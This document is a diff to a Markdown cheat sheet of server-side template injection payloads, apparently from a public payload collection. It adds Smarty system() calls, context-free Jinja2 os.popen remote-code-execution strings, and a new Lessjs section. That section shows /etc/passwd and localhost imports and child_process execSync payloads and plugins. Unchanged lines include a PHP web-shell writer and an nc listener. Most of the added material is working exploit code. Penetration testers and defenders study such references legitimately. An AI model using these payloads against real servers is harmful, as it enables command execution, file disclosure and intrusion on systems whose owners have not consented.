@@ -8,12 +8,12 @@
 * [Methodology](#methodology)
 * [Ruby](#ruby)
   * [Basic injections](#ruby---basic-injections)
-  * [Retrieve /etc/passwd](#ruby---retrieve--etc-passwd)
+  * [Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
   * [List files and directories](#ruby---list-files-and-directories)
 * [Java](#java)
   * [Basic injection](#java---basic-injection)
-  * [Retrieve the system’s environment variables](#java---retrieve-the-system-s-environment-variables)
-  * [Retrieve /etc/passwd](#java---retrieve--etc-passwd)
+  * [Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
+  * [Retrieve /etc/passwd](#java---retrieve-etcpasswd)
 * [Expression Language EL](#expression-language-el)
   * [Basic injection](#expression-language-el---basic-injection)
   * [Code execution](#expression-language-el---code-execution)
@@ -29,7 +29,7 @@
 * [Pebble](#pebble)
   * [Basic injection](#pebble---basic-injection)
   * [Code execution](#pebble---code-execution)
-* [Jade / Codepen](#jade---codepen)
+* [Jade / Codepen](#jade--codepen)
 * [Velocity](#velocity)
 * [Mako](#mako)
 * [Jinja2](#jinja2)
@@ -49,6 +49,7 @@
 * [ASP.NET Razor](#aspnet-razor)
   * [Basic injection](#aspnet-razor---basic-injection)
   * [Command execution](#aspnet-razor---command-execution)
+* [Lessjs](#lessjs)
 * [References](#references)
 
 ## Tools
@@ -233,8 +234,10 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ```python
 {$smarty.version}
-{php}echo `id`;{/php}
+{php}echo `id`;{/php} //deprecated in smarty v3
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')} // compatible v3
+{system('cat index.php')} // compatible v3
 ```
 
 ## Freemarker
@@ -332,7 +335,7 @@ ${x}
 
 ## Jinja2
 
-[Official website](http://jinja.pocoo.org/)
+[Official website](https://jinja.palletsprojects.com/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
 ### Jinja2 - Basic injection
@@ -344,7 +347,7 @@ ${x}
 ```
 
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
-The above injections have been tested on Flask application.
+The above injections have been tested on a Flask application.
 
 ### Jinja2 - Template format
 
@@ -411,7 +414,26 @@ Listen for connection
 nc -lnvp 8000
 ```
 
-#### Exploit the SSTI by calling subprocess.Popen.
+#### Exploit the SSTI by calling os.popen().read()
+
+These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+```python
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+```
+
+```python
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+#### Exploit the SSTI by calling subprocess.Popen
+
 :warning: the number 396 will vary depending of the application.
 
 ```python
@@ -552,6 +574,58 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 }
 ```
 
+## Lessjs
+
+### Lessjs - SSRF / LFI
+
+```less
+@import (inline) "http://localhost";
+// or
+@import (inline) "/etc/passwd";
+```
+
+### Lessjs < v3 - Command Execution
+
+```less
+body {
+  color: `global.process.mainModule.require("child_process").execSync("id")`;
+}
+```
+
+### Plugins
+
+Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.
+
+```less
+// example local plugin usage
+@plugin "plugin-2.7.js";
+```
+or
+```less
+// example remote plugin usage
+@plugin "http://example.com/plugin-2.7.js"
+```
+
+version 2 example RCE plugin:
+
+```javascript
+functions.add('cmd', function(val) {
+  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
+}); 
+```
+version 3 and above example RCE plugin
+
+```javascript
+//Vulnerable plugin (3.13.1)
+registerPlugin({
+    install: function(less, pluginManager, functions) {
+        functions.add('cmd', function(val) {
+            return global.process.mainModule.require('child_process').execSync(val.value).toString();
+        });
+    }
+})
+```
+
 ## References
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
@@ -573,3 +647,4 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
 * [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
 * [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+* [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
